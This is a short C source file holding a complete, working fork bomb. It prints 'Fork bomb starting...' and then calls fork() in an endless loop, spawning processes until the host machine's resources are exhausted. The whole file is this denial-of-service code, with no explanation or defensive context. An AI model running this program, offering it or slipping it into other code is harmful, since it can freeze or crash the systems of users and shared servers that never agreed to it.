#include <unistd.h>
#include <stdio.h>

int main() {
    fprintf(stderr, "Fork bomb starting...\n");
    while(1) {
        fork();
    }
    
    return 0;
}
